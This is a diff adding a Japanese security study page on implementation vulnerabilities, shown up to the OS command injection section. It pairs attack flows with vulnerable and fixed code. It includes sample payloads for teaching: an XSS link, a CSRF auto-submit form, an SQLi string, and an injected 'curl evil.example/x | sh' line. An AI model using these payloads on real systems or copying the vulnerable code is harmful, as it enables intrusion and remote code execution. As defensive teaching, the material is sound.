@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>実装起因の脆弱性</title>
+<meta name="description" content="XSS・CSRF・SQL インジェクション・OS コマンドインジェクション・セッションハイジャック・ReDoS に、パストラバーサル・SSRF・オープンリダイレクト・認可不備を加えて、攻撃の流れと NG/OK コードで図解。">
+<meta name="memo:tags" content="セキュリティ">
+<meta name="memo:date" content="2026-11-03">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&family=Noto+Sans+JP:wght@400;500;700&display=swap">
+<style>
+:root {
+  --bg: #f6f7f9;
+  --surface: #ffffff;
+  --fg: #1c2230;
+  --fg-2: #5a6376;
+  --line: #dde1e8;
+  --accent: #0077b6;
+  --chip: #eceff4;
+  --c-ng: #b91c1c;
+  --c-ok: #15803d;
+  --c-warn: #b45309;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0a0e14;
+    --surface: #111823;
+    --fg: #cdd9e5;
+    --fg-2: #7d8b9d;
+    --line: #1e2d3d;
+    --accent: #00d4ff;
+    --chip: #18222f;
+    --c-ng: #f87171;
+    --c-ok: #4ade80;
+    --c-warn: #fbbf24;
+  }
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'Noto Sans JP', system-ui, sans-serif;
+  font-size: 15px;
+  line-height: 1.7;
+  padding: 40px 16px 72px;
+}
+.wrap { max-width: 880px; margin: 0 auto; }
+a { color: var(--accent); }
+h1 {
+  font-family: 'JetBrains Mono', ui-monospace, monospace;
+  font-size: clamp(1.2rem, 4vw, 1.6rem);
+  color: var(--accent);
+  letter-spacing: 0.06em;
+}
+.subtitle { color: var(--fg-2); font-size: 0.85rem; margin: 4px 0 28px; }
+h2 {
+  font-size: 1.1rem;
+  margin: 44px 0 12px;
+  padding-left: 10px;
+  border-left: 3px solid var(--accent);
+}
+h2 .en { font: 500 0.75rem 'JetBrains Mono', ui-monospace, monospace; color: var(--fg-2); margin-left: 6px; }
+h3 { font-size: 0.95rem; margin: 18px 0 6px; }
+p { margin: 8px 0; }
+code {
+  font-family: 'JetBrains Mono', ui-monospace, monospace;
+  font-size: 0.85em;
+  background: var(--chip);
+  padding: 1px 5px;
+  border-radius: 4px;
+  overflow-wrap: anywhere;
+}
+pre {
+  font-family: 'JetBrains Mono', ui-monospace, monospace;
+  font-size: 0.76rem;
+  line-height: 1.6;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 8px;
+  padding: 12px 14px;
+  overflow-x: auto;
+  margin: 10px 0;
+}
+pre code { background: none; padding: 0; font-size: inherit; overflow-wrap: normal; }
+.cm { color: var(--fg-2); }
+.bad { background: color-mix(in srgb, var(--c-ng) 20%, transparent); border-radius: 3px; }
+.good { background: color-mix(in srgb, var(--c-ok) 20%, transparent); border-radius: 3px; }
+.card {
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 16px 18px;
+  margin: 12px 0;
+}
+.summary { border-left: 3px solid var(--accent); }
+.summary li, ul.list li { margin-left: 1.2em; }
+ul.list { margin: 8px 0; }
+ul.list li { margin-bottom: 4px; }
+.note { font-size: 0.83rem; color: var(--fg-2); }
+.warn-box {
+  border-left: 3px solid var(--c-warn);
+  background: color-mix(in srgb, var(--c-warn) 8%, var(--surface));
+}
+.warn-box strong { color: var(--c-warn); }
+
+/* 全体マップ */
+.map {
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) auto minmax(0, 2.2fr);
+  gap: 12px;
+  align-items: center;
+  margin: 14px 0;
+}
+.map .col-title { font: 700 0.72rem 'JetBrains Mono', ui-monospace, monospace; color: var(--fg-2); margin-bottom: 6px; letter-spacing: .05em; }
+.map .inputs { display: grid; gap: 6px; }
+.map .inputs span {
+  background: var(--chip);
+  border-radius: 6px;
+  padding: 4px 10px;
+  font-size: 0.8rem;
+}
+.map .app {
+  writing-mode: vertical-rl;
+  background: var(--accent);
+  color: var(--bg);
+  font: 700 0.85rem 'Noto Sans JP', sans-serif;
+  border-radius: 10px;
+  padding: 14px 8px;
+  letter-spacing: .2em;
+}
+.map .app::after { content: ' →'; }
+.sinks { display: grid; grid-template-columns: repeat(auto-fill, minmax(min(100%, 150px), 1fr)); gap: 8px; }
+.sink {
+  display: block;
+  text-decoration: none;
+  color: inherit;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-left: 3px solid var(--c-ng);
+  border-radius: 8px;
+  padding: 8px 10px;
+  transition: border-color .15s;
+}
+.sink:hover { border-color: var(--accent); }
+.sink .to { font: 700 0.72rem 'JetBrains Mono', ui-monospace, monospace; color: var(--fg-2); }
+.sink .v { font-weight: 700; font-size: 0.88rem; color: var(--accent); }
+.map2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(100%, 260px), 1fr)); gap: 10px; }
+.map2 .sink { border-left-color: var(--c-warn); }
+@media (max-width: 640px) {
+  .map { grid-template-columns: 1fr; }
+  .map .inputs { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
+  .map .app { writing-mode: horizontal-tb; text-align: center; padding: 8px; }
+  .map .app::after { content: ' ↓'; }
+}
+
+/* 表 */
+.tbl { overflow-x: auto; margin: 10px 0; }
+table { border-collapse: collapse; width: 100%; font-size: 0.83rem; min-width: 520px; }
+th, td { border-bottom: 1px solid var(--line); padding: 8px 10px; text-align: left; vertical-align: top; }
+th {
+  font: 700 0.72rem 'JetBrains Mono', ui-monospace, monospace;
+  color: var(--fg-2);
+  letter-spacing: .04em;
+}
+td a { font-weight: 700; }
+
+/* ステップ */
+ol.flow {
+  list-style: none;
+  counter-reset: s;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(min(100%, 170px), 1fr));
+  gap: 10px;
+  margin: 12px 0;
+}
+ol.flow li {
+  counter-increment: s;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 10px 12px;
+  font-size: 0.83rem;
+}
+ol.flow li::before {
+  content: counter(s);
+  display: inline-grid;
+  place-items: center;
+  width: 20px; height: 20px;
+  border-radius: 50%;
+  background: var(--accent);
+  color: var(--bg);
+  font: 700 0.72rem 'JetBrains Mono', ui-monospace, monospace;
+  margin-right: 6px;
+}
+ol.flow li.x { border-color: var(--c-ng); }
+ol.flow li.x::before { background: var(--c-ng); }
+
+/* NG / OK */
+.vs {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(min(100%, 340px), 1fr));
+  gap: 12px;
+  margin: 12px 0;
+}
+.vs > div { min-width: 0; display: flex; flex-direction: column; }
+.vs > div .code-head { align-self: flex-start; }
+.code-head {
+  display: inline-block;
+  font: 700 0.72rem 'JetBrains Mono', ui-monospace, monospace;
+  padding: 3px 12px;
+  border-radius: 8px 8px 0 0;
+}
+.code-head.ng { background: var(--c-ng); color: var(--bg); }
+.code-head.ok { background: var(--c-ok); color: var(--bg); }
+.vs pre { margin: 0; border-top-left-radius: 0; flex: 1; }
+
+/* 対策 */
+.def { display: grid; grid-template-columns: repeat(auto-fit, minmax(min(100%, 240px), 1fr)); gap: 10px; margin: 12px 0; }
+.def > div { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 10px 14px; font-size: 0.85rem; }
+.def .lv { font: 700 0.7rem 'JetBrains Mono', ui-monospace, monospace; letter-spacing: .05em; }
+.def .root .lv { color: var(--c-ok); }
+.def .aux .lv { color: var(--fg-2); }
+.def ul { margin-top: 4px; }
+.def li { margin-left: 1.1em; }
+
+/* タブ */
+.tabs { display: flex; flex-wrap: wrap; gap: 6px; margin: 12px 0 10px; }
+.tab {
+  border: 1px solid var(--line);
+  background: var(--chip);
+  color: var(--fg-2);
+  border-radius: 999px;
+  padding: 5px 14px;
+  font: 600 0.78rem 'JetBrains Mono', ui-monospace, monospace;
+  cursor: pointer;
+}
+.tab[aria-selected="true"] { background: var(--accent); border-color: var(--accent); color: var(--bg); }
+.panel[hidden] { display: none; }
+
+/* ReDoS デモ */
+.demo-ctrl { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin: 8px 0; font-size: 0.85rem; }
+.demo-ctrl input[type=range] { flex: 1 1 160px; accent-color: var(--accent); }
+.demo-ctrl output { font: 700 0.85rem 'JetBrains Mono', ui-monospace, monospace; min-width: 4.5em; }
+.btn {
+  border: 1px solid var(--accent);
+  background: var(--accent);
+  color: var(--bg);
+  border-radius: 999px;
+  padding: 6px 16px;
+  font: 700 0.78rem 'JetBrains Mono', ui-monospace, monospace;
+  cursor: pointer;
+}
+.btn:disabled { opacity: .5; cursor: wait; }
+.bars { display: grid; gap: 4px; margin: 10px 0; }
+.bar-row { display: grid; grid-template-columns: 4.2em minmax(0, 1fr) 5.6em; gap: 8px; align-items: center; font: 0.72rem 'JetBrains Mono', ui-monospace, monospace; }
+.bar-row .track { background: var(--chip); border-radius: 4px; height: 14px; overflow: hidden; }
+.bar-row .fill { height: 100%; background: var(--c-ng); width: 0; transition: width .3s; }
+.bar-row.safe .fill { background: var(--c-ok); }
+.bar-row .ms { text-align: right; color: var(--fg-2); }
+#redos-extra { font-size: 0.85rem; }
+
+.myth { display: grid; gap: 10px; }
+.myth .card { margin: 0; }
+.myth .q { font-weight: 700; }
+.myth .q::before { content: '✗ '; color: var(--c-ng); }
+.myth .a::before { content: '→ '; color: var(--c-ok); font-weight: 700; }
+
+footer#memo-backlink {
+  margin-top: 40px;
+  padding-top: 16px;
+  border-top: 1px solid var(--line);
+  text-align: center;
+}
+footer#memo-backlink a {
+  display: inline-block;
+  padding: 6px 14px;
+  border-radius: 999px;
+  background: var(--chip);
+  color: var(--fg-2);
+  font: 600 12px/1.4 'JetBrains Mono', ui-monospace, monospace;
+  letter-spacing: .08em;
+  text-decoration: none;
+}
+footer#memo-backlink a:hover { color: var(--accent); }
+</style>
+<!-- memo:head（scripts/memo.py が自動生成。手で編集しない） -->
+<link rel="icon" href="assets/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/icon-32.png">
+<link rel="icon" type="image/png" sizes="192x192" href="assets/icon-192.png">
+<link rel="apple-touch-icon" href="assets/apple-touch-icon.png">
+<meta name="apple-mobile-web-app-title" content="MEMO">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="MEMO">
+<meta property="og:title" content="実装起因の脆弱性">
+<meta property="og:description" content="XSS・CSRF・SQL インジェクション・OS コマンドインジェクション・セッションハイジャック・ReDoS に、パストラバーサル・SSRF・オープンリダイレクト・認可不備を加えて、攻撃の流れと NG/OK コードで図解。">
+<meta property="og:url" content="https://memo.taka1156.site/web-vulnerabilities.html">
+<meta property="og:image" content="https://memo.taka1156.site/assets/og.png?v=3758f4c4">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<!-- /memo:head -->
+</head>
+<body>
+<div class="wrap">
+  <h1>実装起因の脆弱性</h1>
+  <p class="subtitle">攻撃の多くは「信頼できない入力が、それを解釈する何かにそのまま届く」場所で起きる</p>
+
+  <div class="card summary">
+    <strong>ざっくり言うと</strong>
+    <ul>
+      <li><b>インジェクション系</b>（XSS・SQL・OS コマンド・パス）は、データが<b>コードとして解釈される</b>ことが原因。対策は「入力を消毒」より、<b>出力先ごとにデータとコードを分ける</b>（プレースホルダ・エスケープ・引数配列）</li>
+      <li><b>CSRF・セッションハイジャック</b>は、ブラウザが<b>自動で送る Cookie</b> を悪用する。SameSite・トークン・ログイン時の ID 再生成で防ぐ</li>
+      <li><b>ReDoS・SSRF・認可不備</b>は、計算量・サーバーの置き場所・権限チェック漏れの問題。ライブラリ任せにできず<b>設計で防ぐ</b></li>
+    </ul>
+  </div>
+
+  <!-- ======================== Map ======================== -->
+  <h2 id="map">全体マップ</h2>
+  <p>左の「外から来る値」が、右の「解釈するもの」にそのまま渡ると脆弱性になります。カードを押すと各セクションへ。</p>
+  <div class="map">
+    <div>
+      <div class="col-title">外から来る値</div>
+      <div class="inputs">
+        <span>URL のクエリ・パス</span>
+        <span>フォーム / JSON の本文</span>
+        <span>ヘッダー・Cookie</span>
+        <span>アップロードファイル名</span>
+        <span>DB に保存済みの値</span>
+      </div>
+    </div>
+    <div class="app">アプリ</div>
+    <div>
+      <div class="col-title">解釈するもの（sink）</div>
+      <div class="sinks">
+        <a class="sink" href="#xss"><div class="to">HTML / DOM</div><div class="v">XSS</div></a>
+        <a class="sink" href="#sqli"><div class="to">SQL</div><div class="v">SQL インジェクション</div></a>
+        <a class="sink" href="#oscmd"><div class="to">シェル</div><div class="v">OS コマンド</div></a>
+        <a class="sink" href="#path"><div class="to">ファイルパス</div><div class="v">パストラバーサル</div></a>
+        <a class="sink" href="#redos"><div class="to">正規表現エンジン</div><div class="v">ReDoS</div></a>
+        <a class="sink" href="#ssrf"><div class="to">サーバーからの URL 取得</div><div class="v">SSRF</div></a>
+        <a class="sink" href="#redirect"><div class="to">リダイレクト先</div><div class="v">オープンリダイレクト</div></a>
+      </div>
+    </div>
+  </div>
+  <p class="note">入力の中身ではなく、仕組みの穴を突くもの:</p>
+  <div class="map2">
+    <a class="sink" href="#csrf"><div class="to">ブラウザが Cookie を自動で付ける</div><div class="v">CSRF</div></a>
+    <a class="sink" href="#session"><div class="to">セッション ID ＝ ログインの鍵</div><div class="v">セッションハイジャック</div></a>
+    <a class="sink" href="#idor"><div class="to">「誰のデータか」の確認漏れ</div><div class="v">認可不備 (IDOR)</div></a>
+  </div>
+
+  <div class="tbl"><table>
+    <thead><tr><th>脆弱性</th><th>何が起きる</th><th>根本対策</th><th>補助・多層防御</th></tr></thead>
+    <tbody>
+      <tr><td><a href="#xss">XSS</a></td><td>他人のブラウザで攻撃者の JS が動く</td><td>出力先の文脈に合ったエスケープ（テンプレートの自動エスケープ）</td><td>CSP、HttpOnly Cookie</td></tr>
+      <tr><td><a href="#csrf">CSRF</a></td><td>ログイン中のユーザーに、意図しない操作をさせる</td><td>SameSite Cookie ＋ トークン or Origin / Sec-Fetch-Site 検証</td><td>重要操作の再認証</td></tr>
+      <tr><td><a href="#sqli">SQLi</a></td><td>DB の読み出し・改ざん・認証回避</td><td>プレースホルダ（パラメータ化クエリ）</td><td>DB ユーザーの権限最小化</td></tr>
+      <tr><td><a href="#oscmd">OS コマンド</a></td><td>サーバー上で任意のコマンド実行</td><td>シェルを通さない（引数配列）、そもそも外部コマンドを使わない</td><td>入力の許可リスト、実行ユーザーの権限最小化</td></tr>
+      <tr><td><a href="#session">セッションハイジャック</a></td><td>他人としてログインされる</td><td>推測不能な ID、ログイン時に再生成、Secure / HttpOnly</td><td>有効期限、重要操作の再認証</td></tr>
+      <tr><td><a href="#redos">ReDoS</a></td><td>1 リクエストで CPU を占有しサービス停止</td><td>危険な正規表現を書かない、線形時間のエンジン</td><td>入力長の上限</td></tr>
+      <tr><td><a href="#path">パストラバーサル</a></td><td>公開ディレクトリ外のファイルを読まれる・書かれる</td><td>正規化してから基準ディレクトリ内か確認、ID で引く</td><td>実行ユーザーの権限</td></tr>
+      <tr><td><a href="#ssrf">SSRF</a></td><td>サーバー経由で内部ネットワークやクラウドのメタデータにアクセス</td><td>接続先の許可リスト</td><td>内部宛ての遮断、IMDSv2</td></tr>
+      <tr><td><a href="#redirect">オープンリダイレクト</a></td><td>正規ドメインを踏み台にフィッシングへ誘導</td><td>自サイト内のパスだけ許可</td><td>—</td></tr>
+      <tr><td><a href="#idor">IDOR</a></td><td>ID を書き換えて他人のデータを見る・変える</td><td>毎回「このユーザーの持ち物か」を確認</td><td>推測しにくい ID（それだけでは不十分）</td></tr>
+    </tbody>
+  </table></div>
+
+  <!-- ======================== Principles ======================== -->
+  <h2 id="principle">共通の考え方</h2>
+  <div class="def">
+    <div class="root"><div class="lv">① データとコードを分ける</div>文字列を連結してから「解釈するもの」に渡さない。プレースホルダ・引数配列・<code>textContent</code> のように、<b>最初から「これはデータ」と伝える API</b> を使う。</div>
+    <div class="root"><div class="lv">② 出すときに、出す先に合わせる</div>エスケープは<b>出力時に、出力先の文脈（HTML / 属性 / URL / SQL）で</b>行う。入力時に一律で「危険な文字を消す」と、文脈が違う場所で漏れたり、正しいデータを壊したりする。</div>
+    <div class="root"><div class="lv">③ 許可リストで検証する</div>「危ないものを弾く（拒否リスト）」ではなく「想定したものだけ通す」。並び替え列・ホスト名・ファイル名・リダイレクト先は特に。</div>
+    <div class="aux"><div class="lv">④ 破られた前提で被害を絞る</div>DB ユーザー・プロセスの権限最小化、<a href="security-headers.html">セキュリティヘッダー</a>、ログと監視。1 枚の壁に頼らない。</div>
+  </div>
+
+  <!-- ======================== XSS ======================== -->
+  <h2 id="xss">XSS<span class="en">Cross-Site Scripting</span></h2>
+  <p>ユーザー入力が HTML として解釈され、<b>他のユーザーのブラウザで攻撃者の JavaScript が動く</b>。そのページの権限で、表示の書き換え・入力の盗み見・ユーザーになりすましたリクエスト送信ができます。</p>
+
+  <div class="tabs" role="tablist">
+    <button class="tab" role="tab" aria-selected="true" data-panel="xss-r">反射型</button>
+    <button class="tab" role="tab" aria-selected="false" data-panel="xss-s">格納型</button>
+    <button class="tab" role="tab" aria-selected="false" data-panel="xss-d">DOM ベース</button>
+  </div>
+  <div class="panel" id="xss-r">
+    <ol class="flow">
+      <li>攻撃者が <code>/search?q=&lt;script&gt;…&lt;/script&gt;</code> のリンクを用意</li>
+      <li>被害者がメールや SNS のリンクを踏む</li>
+      <li class="x">サーバーが <code>q</code> をそのまま HTML に埋めて返す</li>
+      <li class="x">被害者のブラウザでスクリプトが実行される</li>
+    </ol>
+  </div>
+  <div class="panel" id="xss-s" hidden>
+    <ol class="flow">
+      <li>攻撃者がコメント欄やプロフィールにスクリプトを投稿</li>
+      <li>DB に保存される</li>
+      <li class="x">そのページを見た<b>全員</b>のブラウザで実行される</li>
+    </ol>
+    <p class="note">リンクを踏ませる必要がなく、被害が広がりやすい。管理画面で表示される問い合わせ内容なども狙われる。</p>
+  </div>
+  <div class="panel" id="xss-d" hidden>
+    <ol class="flow">
+      <li>攻撃者が <code>/#&lt;img src=x onerror=…&gt;</code> のリンクを用意</li>
+      <li class="x">フロントの JS が <code>location.hash</code> を <code>innerHTML</code> に入れる</li>
+      <li class="x">サーバーを通らずに実行される（# 以降はサーバーに送られない）</li>
+    </ol>
+    <p class="note">サーバー側のエスケープでは防げない。フロントエンドで危険な API を使っていないかが問題。</p>
+  </div>
+
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>app.get('/search', (req, res) =&gt; {
+  res.send(`&lt;p&gt;「<span class="bad">${req.query.q}</span>」の結果&lt;/p&gt;`);
+});
+
+<span class="cm">// フロント</span>
+el.<span class="bad">innerHTML</span> = location.hash.slice(1);
+link.href = user.website; <span class="cm">// javascript:… も入る</span></code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code><span class="cm">// テンプレートエンジンの自動エスケープに任せる</span>
+res.render('search', { q: req.query.q }); <span class="cm">// &lt;%= q %&gt;</span>
+
+<span class="cm">// フロント: 文字列はテキストとして入れる</span>
+el.<span class="good">textContent</span> = location.hash.slice(1);
+<span class="cm">// URL はスキームを確認してから</span>
+const u = new URL(user.website);
+if (<span class="good">['https:', 'http:'].includes(u.protocol)</span>) link.href = u.href;</code></pre></div>
+  </div>
+
+  <h3>エスケープは「どこに出すか」で変わる</h3>
+  <div class="tbl"><table>
+    <thead><tr><th>出力先</th><th>例</th><th>必要な処理</th></tr></thead>
+    <tbody>
+      <tr><td>HTML の本文</td><td><code>&lt;p&gt;{x}&lt;/p&gt;</code></td><td><code>&amp; &lt; &gt;</code> をエスケープ</td></tr>
+      <tr><td>属性値</td><td><code>&lt;input value="{x}"&gt;</code></td><td>上に加えて <code>" '</code>。属性は必ず引用符で囲む</td></tr>
+      <tr><td>URL 属性</td><td><code>&lt;a href="{x}"&gt;</code></td><td>エスケープだけでは不十分。<code>javascript:</code> を防ぐため<b>スキームを許可リストで確認</b></td></tr>
+      <tr><td>&lt;script&gt; の中</td><td><code>var a = '{x}'</code></td><td>HTML エスケープでは防げない。<code>data-*</code> 属性や JSON（<code>&lt;</code> をエスケープ）で渡す</td></tr>
+      <tr><td>イベント属性・<code>style</code></td><td><code>onclick="{x}"</code></td><td>ユーザー入力を入れない</td></tr>
+    </tbody>
+  </table></div>
+  <p class="note">React / Vue / Svelte なども、<code>{x}</code> の埋め込みは自動でエスケープしますが、<code>dangerouslySetInnerHTML</code> / <code>v-html</code> / <code>{@html}</code> は<b>素通し</b>です。ユーザーの HTML を表示したいときは DOMPurify などのサニタイザーを通します。</p>
+
+  <div class="def">
+    <div class="root"><div class="lv">根本対策</div><ul><li>テンプレートの自動エスケープを使い、無効化しない</li><li><code>innerHTML</code> 系を避け <code>textContent</code></li><li>URL はスキームを確認</li></ul></div>
+    <div class="aux"><div class="lv">補助</div><ul><li><a href="security-headers.html#csp">CSP</a>（nonce 方式）で注入スクリプトを止める</li><li>Cookie に HttpOnly</li><li>Trusted Types で危険な API を封じる</li></ul></div>
+  </div>
+
+  <!-- ======================== CSRF ======================== -->
+  <h2 id="csrf">CSRF<span class="en">Cross-Site Request Forgery</span></h2>
+  <p>ブラウザは、どのサイトから送られたリクエストでも、<b>宛先サイトの Cookie を自動で付けてきた</b>。これを利用して、ログイン中のユーザーに罠サイトから「送金」「パスワード変更」などのリクエストを送らせる攻撃です。攻撃者はレスポンスを読めませんが、<b>操作が実行されれば十分</b>です。</p>
+  <ol class="flow">
+    <li>被害者は <code>bank.example</code> にログイン中（Cookie あり）</li>
+    <li>罠サイト <code>evil.example</code> を開く</li>
+    <li class="x">罠ページの隠しフォームが <code>bank.example/transfer</code> に自動 POST</li>
+    <li class="x">ブラウザが bank の Cookie を付けて送信 → 正規の操作として処理される</li>
+  </ol>
+<pre><code><span class="cm">&lt;!-- evil.example 上の罠 --&gt;</span>
+&lt;form action="https://bank.example/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="100000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code><span class="cm">// Cookie があればそのまま実行</span>
+app.post('/transfer', requireLogin, transfer);
+
+<span class="cm">// GET で状態を変える（リンク 1 つで発火）</span>
+app.<span class="bad">get</span>('/account/delete', requireLogin, del);
+
+res.cookie('sid', id); <span class="cm">// SameSite 未指定</span></code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>res.cookie('__Host-sid', id, {
+  secure: true, httpOnly: true, path: '/',
+  <span class="good">sameSite: 'lax'</span>,
+});
+
+<span class="cm">// 状態を変えるリクエストは送信元を確認</span>
+app.use((req, res, next) =&gt; {
+  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
+  const site = req.get('<span class="good">Sec-Fetch-Site</span>');
+  if (site) {
+    if (site === 'same-origin' || site === 'none') return next();
+    return res.status(403).end();
+  }
+  <span class="cm">// 古いブラウザ向け: Origin ヘッダーで確認</span>
+  if (req.get('Origin') === 'https://bank.example') return next();
+  return res.status(403).end();
+});</code></pre></div>
+  </div>
+
+  <div class="tbl"><table>
+    <thead><tr><th>対策</th><th>仕組み</th><th>注意点</th></tr></thead>
+    <tbody>
+      <tr><td><code>SameSite=Lax</code> / <code>Strict</code></td><td>別サイトからの POST・iframe・fetch に Cookie を付けない</td><td>Lax は<b>トップレベルの GET 遷移では送る</b>ので、GET で状態を変えると防げない。SameSite の「サイト」は登録ドメイン単位なので、<b>脆弱なサブドメイン</b>からは同一サイト扱いで送られる</td></tr>
+      <tr><td>CSRF トークン</td><td>フォームにセッションと紐づく乱数を埋め、送信時に照合。罠サイトはその値を読めない</td><td>フレームワークの仕組みを使う。トークンを URL に載せない</td></tr>
+      <tr><td><code>Sec-Fetch-Site</code> / <code>Origin</code> の検証</td><td>ブラウザが付ける送信元情報で、別サイトからのリクエストを拒否</td><td>主要ブラウザが対応。Go 1.25 の <code>http.CrossOriginProtection</code> もこの方式</td></tr>
+      <tr><td>JSON API ＋ カスタムヘッダー必須</td><td>独自ヘッダー付きのクロスオリジン要求はプリフライトが必要になり、CORS で許可しない限り送れない</td><td><code>Content-Type: text/plain</code> などの単純リクエストを受け付けてしまわないこと（<a href="cors-sop.html">CORS</a>）</td></tr>
+    </tbody>
+  </table></div>
+  <p class="note">Cookie ではなく <code>Authorization: Bearer</code> ヘッダーでトークンを送る API は、ブラウザが自動で付けないので CSRF の対象になりにくい（その代わり XSS でトークンを読まれる。<a href="jwt-vs-session.html">JWT とセッション</a>）。</p>
+
+  <!-- ======================== SQLi ======================== -->
+  <h2 id="sqli">SQL インジェクション</h2>
+  <p>入力を文字列連結で SQL に埋めると、入力中の <code>'</code> で文字列が閉じられ、<b>後ろが SQL の命令として解釈</b>されます。</p>
+  <div class="card">
+<pre style="margin:0"><code>SELECT * FROM users WHERE email = '<span class="bad">' OR 1=1 --</span>' AND password_hash = '…'
+<span class="cm">                                      ↑ ここで文字列が閉じ、OR 1=1 で全件一致、-- 以降はコメント扱い</span></code></pre>
+    <p class="note">ほかにも <code>UNION SELECT</code> で別テーブルを読む、<code>; DROP TABLE</code> で複数文を実行する（ドライバーが許す場合）、応答時間の差から 1 文字ずつ推測する（ブラインド SQLi）などがある。</p>
+  </div>
+
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>import { sql } from 'drizzle-orm';
+
+<span class="cm">// sql.raw() は文字列をエスケープせずそのまま埋め込む</span>
+await db.execute(<span class="bad">sql.raw</span>(
+  `SELECT * FROM users WHERE email = '<span class="bad">${email}</span>'`
+));
+
+<span class="cm">// 並び替え列を外から受け取る</span>
+db.select().from(items)
+  .orderBy(<span class="bad">sql.raw(req.query.sort)</span>);
+
+<span class="cm">// sql`` の中でも sql.raw を挟むと素通し</span>
+db.execute(sql`… WHERE name = ${<span class="bad">sql.raw(`'${name}'`)</span>}`);</code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>import { sql, eq, asc, desc } from 'drizzle-orm';
+
+<span class="cm">// クエリビルダー: 値は自動でプレースホルダ ($1) になる</span>
+const rows = await db.select().from(users)
+  .where(<span class="good">eq(users.email, email)</span>);
+
+<span class="cm">// 生 SQL も sql`` タグなら ${} はパラメータとして別送</span>
+await db.execute(
+  sql`SELECT * FROM ${users} WHERE ${users.email} = <span class="good">${email}</span>`
+);
+
+<span class="cm">// 列・並び順はプレースホルダにできない → 許可リストから選ぶ</span>
+const SORT = new Map([
+  ['new', desc(items.createdAt)],
+  ['price', asc(items.price)],
+]);
+const order = <span class="good">SORT.get(String(req.query.sort)) ?? SORT.get('new')</span>;
+db.select().from(items).orderBy(order);</code></pre></div>
+  </div>
+  <p class="note"><code>users</code> / <code>items</code> は Drizzle のテーブル定義（<code>pgTable</code> など）。<code>sql``</code> に渡した値は <code>$1</code> などに置き換えられて別送され、テーブル・列オブジェクトは識別子としてエスケープされます。危ないのは文字列を加工せず入れる <code>sql.raw()</code> に外からの値を渡したときです。許可リストを普通のオブジェクトにして <code>obj[key]</code> で引くと、<code>constructor</code> などの継承プロパティも当たってしまうので、<code>Map</code> か <code>Object.hasOwn()</code> で確認します。</p>
+  <div class="def">
+    <div class="root"><div class="lv">根本対策</div><ul><li>すべての値をプレースホルダで渡す</li><li>テーブル名・列名・<code>ASC/DESC</code> は許可リストから選ぶ</li><li><code>LIKE</code> の <code>% _</code> は値としてエスケープ</li></ul></div>
+    <div class="aux"><div class="lv">補助</div><ul><li>アプリ用 DB ユーザーの権限を最小に（DDL 不可など）</li><li>DB のエラー内容を画面に出さない</li></ul></div>
+  </div>
+
+  <!-- ======================== OS command ======================== -->
+  <h2 id="oscmd">OS コマンドインジェクション</h2>
+  <p>入力をシェルのコマンド文字列に埋めると、<code>;</code> <code>|</code> <code>&amp;&amp;</code> <code>$()</code> <code>`…`</code> などの<b>シェルの記号</b>で、別のコマンドをつなげられます。サーバー上で任意のコマンドが実行されるので、被害は最大級です。</p>
+  <ol class="flow">
+    <li>「ping テスト」画面にホスト名を入力させる</li>
+    <li class="x">攻撃者が <code>8.8.8.8; curl evil.example/x | sh</code> と入力</li>
+    <li class="x">サーバーが <code>sh -c "ping -c 1 8.8.8.8; curl … | sh"</code> を実行</li>
+  </ol>
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>import { exec } from 'node:child_process';
+
+<span class="cm">// exec はシェル経由で実行する</span>
+<span class="bad">exec</span>(`ping -c 1 <span class="bad">${req.body.host}</span>`, cb);
+
+<span class="cm">// spawn でも shell: true なら同じ</span>
+spawn(`convert ${file} out.png`, { <span class="bad">shell: true</span> });</code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>import { execFile } from 'node:child_process';
+import net from 'node:net';
+
+const host = req.body.host;
+<span class="cm">// ① 許可リストで検証（- で始まる値はオプション扱いされる）</span>
+if (<span class="good">!net.isIP(host)</span>) return res.status(400).end();
+
+<span class="cm">// ② シェルを通さず、引数を配列で渡す</span>
+<span class="good">execFile</span>('ping', <span class="good">['-c', '1', host]</span>, cb);</code></pre></div>
+  </div>
+  <div class="def">
+    <div class="root"><div class="lv">根本対策</div><ul><li>外部コマンドを使わず、言語のライブラリで処理する（画像処理・圧縮・メール送信など）</li><li>使うなら <code>execFile</code> / <code>spawn</code> の引数配列（シェルを起動しない）</li></ul></div>
